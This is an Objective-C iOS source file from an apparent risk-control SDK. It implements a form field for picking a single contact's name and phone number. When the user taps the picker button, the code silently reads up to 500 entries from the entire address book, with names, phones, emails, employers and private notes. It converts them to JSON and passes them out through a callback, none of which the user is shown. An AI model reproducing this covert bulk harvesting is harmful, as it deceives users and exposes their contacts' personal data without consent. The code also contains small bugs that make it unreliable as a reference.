//
//  SDKAddressView.m
//  RiskControlSDK
//
//  Created by 栾美娜 on 2017/2/20.
//  Copyright © 2017年 栾美娜. All rights reserved.
//

#import "SDKAddressView.h"
// other
#import "SDKCommonModel.h"
#import "SDKBaseViewController.h"
#import "SDKProjectHeader.h"
#import "UIView+SDKCustomView.h"
#import "SDKJWTextField.h"
#import "SDKCustomLabel.h"
#import "SDKLineView.h"
#import "SDKJWAlertView.h"
#import "SDKFormatJudge.h"

// address
#import <AddressBook/AddressBook.h>
#import <AddressBookUI/AddressBookUI.h>
#import <ContactsUI/ContactsUI.h>


@interface SDKAddressView () <ABPeoplePickerNavigationControllerDelegate,CNContactPickerDelegate, SDKJWAlertViewDelegate>

@property (nonatomic, strong) SDKBaseViewController *superVC;
@property (nonatomic, strong) ABPeoplePickerNavigationController *addressVC;
@property (nonatomic, strong) CNContactPickerViewController *contactVC;

@property (nonatomic, strong) UIView *oneView;
@property (nonatomic, strong) UIView *twoView;


@property (nonatomic, strong) SDKMNChineseField *nameField;
@property (nonatomic, strong) SDKCustomLabel *phoneR;

@property (nonatomic, strong) NSMutableArray *dataArray;
@property (assign, nonatomic) NSInteger personCount;

@property (nonatomic, strong) SDKCommonModel *currentModel;
@property (nonatomic, copy) NSString *recordStr;



@end

@implementation SDKAddressView

- (ABPeoplePickerNavigationController *)addressVC {
    if (!_addressVC) {
        _addressVC = [[ABPeoplePickerNavigationController alloc] init];
        _addressVC.peoplePickerDelegate = self;
    }
    return _addressVC;
}

- (CNContactPickerViewController *)contactVC {
    if (!_contactVC) {
        _contactVC = [[CNContactPickerViewController alloc] init];
        _contactVC.delegate = self;
        _contactVC.displayedPropertyKeys = @[CNContactGivenNameKey, CNContactFamilyNameKey,CNContactPhoneNumbersKey];
    }
    return _contactVC;
}

- (instancetype)initWithFrame:(CGRect)frame model:(SDKCommonModel *)model innerVC:(SDKBaseViewController *)innerVC
{
    self = [super initWithFrame:frame];
    if (self) {
        self.frame = frame;
        self.backgroundColor = commonWhiteColor;
        _superVC = innerVC;
        _currentModel = model;
        
        // one
        _oneView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, kScreenWidth, adaptY(39))];
        [self addSubview:_oneView];
        
        SDKCustomLabel *nameLab = [SDKCustomLabel setLabelTitle:model.label setLabelFrame:CGRectMake(kDefaultPadding, 0, kScreenWidth-2*kDefaultPadding, adaptY(39)) setLabelColor:commonBlackColor setLabelFont:kFont(14)];
        [_oneView addSubview:nameLab];
        
        CGFloat iconBtnWH = adaptY(39);
        CGFloat iconBtnX  = kScreenWidth-iconBtnWH-adaptX(4);
        UIButton *iconBtn = [UIButton buttonWithType:UIButtonTypeCustom];
        iconBtn.frame = CGRectMake(iconBtnX, 0, iconBtnWH,iconBtnWH);
        [iconBtn setImage:[UIImage imageNamed:kImageBundle @"address"] forState:UIControlStateNormal];
        [iconBtn addTarget:self action:@selector(btnAction) forControlEvents:UIControlEventTouchUpInside];
        [_oneView addSubview:iconBtn];
        
        _nameField = [[SDKMNChineseField alloc] initWithFrame:CGRectMake(kScreenWidth*0.5, 0, iconBtnX-kScreenWidth*0.5, adaptY(39))];
        _nameField.font = kFont(14);
        _nameField.textAlignment = 2;
        _nameField.placeholder = model.placeholder;
        [_oneView addSubview:_nameField];
        _nameField.sendValueBlock = ^ (NSString *backStr) {
            _recordStr = backStr;
            DLog(@"%@", backStr);
        };
        
        SDKLineView *bottomL = [[SDKLineView alloc] initWithFrame:CGRectMake(0, adaptY(39)-0.5f, frame.size.width, 0.5f) color:cuttingLineColor];
        [_oneView addSubview:bottomL];
        
        
        // two
        _twoView = [[UIView alloc] initWithFrame:CGRectMake(0, CGRectGetMaxY(_oneView.frame), kScreenWidth, adaptY(39))];
        [self addSubview:_twoView];
        
        SDKCustomLabel *phoneLab = [SDKCustomLabel setLabelTitle:model.label2 setLabelFrame:CGRectMake(kDefaultPadding, 0, kScreenWidth-2*kDefaultPadding, adaptY(39)) setLabelColor:commonBlackColor setLabelFont:kFont(14)];
        [_twoView addSubview:phoneLab];
        
        _phoneR = [SDKCustomLabel setLabelTitle:model.placeholder2 setLabelFrame:CGRectMake(kDefaultPadding, 0, kScreenWidth-2*kDefaultPadding, adaptY(39)) setLabelColor:commonGrayColor setLabelFont:kFont(14) setAlignment:2];
        [_twoView addSubview:_phoneR];
        
        SDKLineView *bottomLL = [[SDKLineView alloc] initWithFrame:CGRectMake(0, adaptY(39)-0.5f, frame.size.width, 0.5f) color:cuttingLineColor];
        [_twoView addSubview:bottomLL];
        
        self.height = CGRectGetMaxY(self.subviews.lastObject.frame);

    }
    return self;
}

- (NSMutableArray *)addressAllInfomation {
    return self.dataArray;
}

- (void)btnAction {
   
    [self judgeAddressAuthorization:^(BOOL res) {
        if (res) {
            DLog(@"Authorized");
            [self getUserAddressInfo]; // 获取通讯录中所有信息
            [self openAddressBook];
        }
        else {
            [[[SDKJWAlertView alloc] initSDKJWAlertViewWithTitle:@"提示" message:@"请到设置>隐私>通讯录打开本应用的权限设置" delegate:self cancelButtonTitle:nil otherButtonTitles:@[@"确定"]] alertShow];
        }
    }];
}

- (void)showContent {
    _recordStr = _nameField.text = _currentModel.value1;
    _phoneR.text = _currentModel.value2;
    _phoneR.textColor = commonBlackColor;
}

// alert delete
- (void)SDKJWAlertView:(SDKJWAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex clickedButtonAtTitle:(NSString *)buttonTitle {
    NSURL * url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
    if (iOS10) {
       
    } else {
        if([[UIApplication sharedApplication] canOpenURL:url]) {
            [[UIApplication sharedApplication] openURL:url];
        }
    }
}

/**
 打开通讯录
 */
- (void)openAddressBook {
    if (iOS9) {
        [_superVC presentViewController:self.contactVC animated:YES completion:nil];
    } else {
        if(iOS8) {
            self.addressVC.predicateForSelectionOfPerson = [NSPredicate predicateWithValue:false];
        }
        [_superVC presentViewController:self.addressVC animated:YES completion:nil];
    }
}

#pragma mark - 判断通讯录授权
- (void)judgeAddressAuthorization:(void(^)(BOOL res ))authorization {
    if (iOS9)
    {
        CNContactStore * contactStore = [[CNContactStore alloc]init];
        
        if ([CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts] == CNAuthorizationStatusNotDetermined)
        {
            [contactStore requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * __nullable error) {
                if (!granted)
                {
                    //iOS9 没有权限
                    if (authorization) authorization(false);
                } else {
                    //iOS9 有权限
                    if (authorization) authorization(true);
                }
            }];
        }
        else if ([CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts] == CNAuthorizationStatusAuthorized)
        {
            //ios9 有权限
            if (authorization) authorization(true);
        }
    }
    else
    {
        ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL, NULL);
        ABAuthorizationStatus authStatus = ABAddressBookGetAuthorizationStatus();
        
        if (authStatus == kABAuthorizationStatusNotDetermined)
        {
            ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    if (!granted)
                    {
                        // ios9 以下 没权限
                        if (authorization) authorization(false);
                    } else {
                        //iOS9以下  有权限
                        if (authorization) authorization(true);
                    }
                    
                });
            });
        }
        else if (authStatus == kABAuthorizationStatusAuthorized)
        {
            //iOS9以下  有权限
            if (authorization) authorization(true);
        }
        
    }
}

#pragma mark - ABPeoplePickerNavigationController delegate
//iOS9 通讯代理
- (void)contactPicker:(CNContactPickerViewController *)picker didSelectContactProperty:(CNContactProperty *)contactProperty {
    CNPhoneNumber *phoneNumber = (CNPhoneNumber *)contactProperty.value;
    
    [picker dismissViewControllerAnimated:true completion:^{
        // 联系人
        NSString *text1 = [NSString stringWithFormat:@"%@%@",contactProperty.contact.familyName,contactProperty.contact.givenName];
        // 电话
        NSArray *phoneNums = contactProperty.contact.phoneNumbers;
        for (CNLabeledValue *labeledValue in phoneNums) {
            // 2.1.获取电话号码的KEY
            NSString *phoneLabel = labeledValue.label;
            
            // 2.2.获取电话号码
            CNPhoneNumber *phoneNumer = labeledValue.value;
            NSString *phoneValue = phoneNumer.stringValue;
        }
        
        _recordStr = _nameField.text = [text1 isEqualToString:@""] ? @"读取失败" : text1;
        
        _phoneR.text = phoneNums.count > 0 ? [self handlerPhoneNumber:phoneNumber.stringValue] : @"读取失败";
        _phoneR.textColor = commonBlackColor;
    }];
    
}

//iOS9以下代理
- (void)peoplePickerNavigationController:(ABPeoplePickerNavigationController*)peoplePicker didSelectPerson:(ABRecordRef)person property:(ABPropertyID)property identifier:(ABMultiValueIdentifier)identifier {
    
    ABMutableMultiValueRef phoneMulti = ABRecordCopyValue(person, kABPersonPhoneProperty);
    NSString *firstName = (__bridge NSString *)ABRecordCopyValue(person, kABPersonFirstNameProperty);
    if (firstName==nil) {
        firstName = @"";
    }
    NSString *lastName=(__bridge NSString *)ABRecordCopyValue(person, kABPersonLastNameProperty);
    if (lastName==nil) {
        lastName = @"";
    }
    NSString *fullname = [NSString stringWithFormat:@"%@%@", lastName, firstName];
    
    NSMutableArray *phones = [NSMutableArray arrayWithCapacity:0];
    for (int i = 0; i < ABMultiValueGetCount(phoneMulti); i++) {
        NSString *aPhone = (__bridge NSString *)ABMultiValueCopyValueAtIndex(phoneMulti, i);
        [phones addObject:aPhone];
    }
    CFIndex index = ABMultiValueGetIndexForIdentifier(phoneMulti,identifier);
    NSDictionary *dic = @{@"fullname": ([fullname isEqualToString:@""] ? @"读取失败" : fullname), @"phone" : phones.count > 0 ? (index != -1 ? [self handlerPhoneNumber:phones[index]] : @"读取失败") : @"读取失败"};
    
    [peoplePicker dismissViewControllerAnimated:true completion:^{

        _recordStr = _nameField.text = dic[@"fullname"];
        _phoneR.text = dic[@"phone"];
        _phoneR.textColor = commonBlackColor;
        
        DLog(@"name:%@ tel:%@", dic[@"fullname"], dic[@"phone"]);
    }];
}

#pragma mark - 获取通讯录中的信息
- (void)getUserAddressInfo {
    
    self.dataArray = [NSMutableArray array];
    __block NSInteger index = 1; // 记录
    
    if (iOS9)
    {
        CNContactStore *store = [[CNContactStore alloc]init];
        //检索的数据
        CNContactFetchRequest *fetch = [[CNContactFetchRequest alloc]initWithKeysToFetch:@[CNContactFamilyNameKey, CNContactGivenNameKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey, CNContactDepartmentNameKey, CNContactOrganizationNameKey, CNContactNoteKey]];
        [store enumerateContactsWithFetchRequest:fetch error:nil usingBlock:^(CNContact * _Nonnull contact, BOOL * _Nonnull stop) {
            // 手机号
            NSMutableString *xx = [NSMutableString string];
            for (CNLabeledValue *label in contact.phoneNumbers) {
                
                NSString *handlePhone = [[label value]stringValue];
                [xx appendFormat:@"%@,", handlePhone];
            }
            NSString *phoneRes = [NSString string];
            if (xx.length > 0) {
                phoneRes = [xx substringToIndex:xx.length-1];
            } else {
                phoneRes = @"";
            }
            // 邮箱
            NSMutableString *emails = [NSMutableString string];
            for (CNLabeledValue *label in contact.emailAddresses) {
                [emails appendFormat:@"%@,", label.value];
            }
            NSString *emailRes = [NSString string];
            if (emails.length > 0) {
                emailRes = [emails substringFromIndex:emails.length-1];
            } else {
                emailRes = @"";
            }
            
            NSDictionary *dic = @{
                                  @"name" : [NSString stringWithFormat:@"%@%@", contact.givenName, contact.familyName],
                                  @"telphone"   : phoneRes,
                                  @"emails"     : emailRes,
                                  @"departmentName" : contact.departmentName,
                                  @"organizationName"  :contact.organizationName,
                                  @"note"             : contact.note
                                  };
            
            if ([contact.familyName isEqualToString:@" "] == NO || [contact.givenName isEqualToString:@" "]) {
                [self.dataArray addObject:dic];
            }
            // 限制
            if (index == 500) {
                return;
            }
            index++;
        }];
    }
    else
    {
        //取得本地通信录名柄
        ABAddressBookRef addressBook ;
        
        if ([[UIDevice currentDevice].systemVersion floatValue] >= 6.0)
        {
            addressBook = ABAddressBookCreateWithOptions(NULL, NULL);
            //等待同意后向下执行
            dispatch_semaphore_t sema = dispatch_semaphore_create(0);
            ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error)
                                                     {
                                                         dispatch_semaphore_signal(sema);
                                                     });
            dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
        }else{
            addressBook = ABAddressBookCreate();
        }
        
        //取得本地所有联系人记录
        CFArrayRef results = ABAddressBookCopyArrayOfAllPeople(addressBook);
        if (results == nil) {
            return;
        }
        
        for(int i = 0; i < CFArrayGetCount(results); i++)
        {
            NSMutableDictionary *dicInfoLocal = [NSMutableDictionary dictionary];
            ABRecordRef person = CFArrayGetValueAtIndex(results, i);
            //读取name
            NSString *familyName = (__bridge NSString*)ABRecordCopyValue(person, kABPersonFirstNameProperty);
            NSString *givenName = (__bridge NSString *)ABRecordCopyValue(person, kABPersonLastNameProperty);
            [dicInfoLocal setObject:[NSString stringWithFormat:@"%@%@", (givenName == nil ? @"" : givenName), (familyName == nil ? @"" : familyName)] forKey:@"name"];
            //读取部门
            NSString *departmentName = (__bridge NSString*)ABRecordCopyValue(person, kABPersonDepartmentProperty);
            [dicInfoLocal setObject:(departmentName == nil ? @"" : departmentName) forKey:@"departmentName"];
            //读取公司
            NSString *organizationName = (__bridge NSString*)ABRecordCopyValue(person, kABPersonOrganizationProperty);
            [dicInfoLocal setObject:(organizationName == nil ? @"" : organizationName) forKey:@"organizationName"];
            //读取备忘录
            NSString *note = (__bridge NSString*)ABRecordCopyValue(person, kABPersonNoteProperty);
            [dicInfoLocal setObject:(note == nil ? @"" : note) forKey:@"note"];
            // 手机号
            NSMutableString *phoneStr = [NSMutableString string];
            ABMultiValueRef phones= ABRecordCopyValue(person, kABPersonPhoneProperty);
            for (NSInteger j=0; j<ABMultiValueGetCount(phones); j++) {
                NSString *resPhone = (__bridge NSString *)(ABMultiValueCopyValueAtIndex(phones, j));
                [phoneStr appendFormat:@"%@,", resPhone];
            }
            NSString *phoneArr = [NSString string];
            if (phoneStr.length > 0) {
                phoneArr  = [phoneStr substringToIndex:phoneStr.length-1];
            } else {
                phoneArr = @"";
            }
            [dicInfoLocal setObject:phoneArr forKey:@"telphone"];
            // 邮件
            NSMutableString *mailStr = [NSMutableString string];
            ABMultiValueRef emails= ABRecordCopyValue(person, kABPersonEmailProperty);
            for (NSInteger j=0; j<ABMultiValueGetCount(emails); j++) {
                [mailStr appendFormat:@"%@,", (__bridge NSString *)(ABMultiValueCopyValueAtIndex(emails, j))];
            }
            NSString *mailArr = [NSString string];
            if (mailStr.length > 0) {
                mailArr = [mailStr substringToIndex:mailStr.length-1];
            } else {
                mailArr = @"";
            }
            [dicInfoLocal setObject:mailArr forKey:@"emails"];
            
            if ([familyName isEqualToString:@" "] == NO || [givenName isEqualToString:@" "]) {
                [self.dataArray addObject:dicInfoLocal];
            }
            // 限制500
            if (index == 500) {
                break;
            }
            index++;
        }
        CFRelease(results);//new
        CFRelease(addressBook);//new
    }
    
    self.personCount = index;
 
    DLog(@"%@ ==%ld", self.dataArray, self.personCount);
    
    // 转json
    NSString *allInfoString = [self arrayBecomeJsonWithArray:self.dataArray];
    NSString *res = @"";
    if (allInfoString) {
        res = allInfoString;
    }
    
    // send
    !_sendAllInfo ? : _sendAllInfo(res);
}


#pragma mark - 重写父类方法
- (void)checkDataAndHandle:(void (^)(NSMutableDictionary *, BOOL))handle{
    NSMutableDictionary *dic = [NSMutableDictionary dictionary];
    dic[_currentModel.name]   = _nameField.text;
    dic[_currentModel.name2]  = _phoneR.text;
    
    if (!_currentModel.required) {
        if (handle) {
            handle(dic, true);
        }
    } else {
        
        if (!_recordStr || [_recordStr isEqualToString:@"读取失败"] || [_recordStr isEqualToString:@""]) {
            _oneView.backgroundColor = kErrorColor;
        } else {
            _oneView.backgroundColor = commonWhiteColor;
        }
        
        if (!_phoneR.text || ![SDKFormatJudge isValidateMobile:_phoneR.text] || [_phoneR.text isEqualToString:@"读取失败"]) {
            _twoView.backgroundColor = kErrorColor;
        } else {
            _twoView.backgroundColor = commonWhiteColor;
        }
        
        if (_recordStr && ![_recordStr isEqualToString:@"读取失败"] && _phoneR.text && [SDKFormatJudge isValidateMobile:_phoneR.text] && ![_phoneR.text isEqualToString:@"读取失败"] && ![_recordStr isEqualToString:@""]) {
            if (handle) {
                handle(dic, true);
            }
        } else {
            if (handle) {
                handle(nil, false);
            }
        }
    }
}


#pragma mark - 处理电话号码
- (NSString *)handlerPhoneNumber:(NSString *)phoneNumber {
    return [phoneNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
}


#pragma mark - 数组转json
- (NSString *)arrayBecomeJsonWithArray:(NSArray *)tmpArray {
    if (tmpArray == nil) {
        return nil;
    }
    NSError *error = nil;

    NSData *jsonData = [NSJSONSerialization
                        dataWithJSONObject:tmpArray options:NSJSONWritingPrettyPrinted error:&error];
    if ([jsonData length] > 0 && error == nil){
        DLog(@"Successfully serialized the dictionary into data.");
        //NSData转换为String
        NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        return jsonString;
    }
    return nil;
}

@end
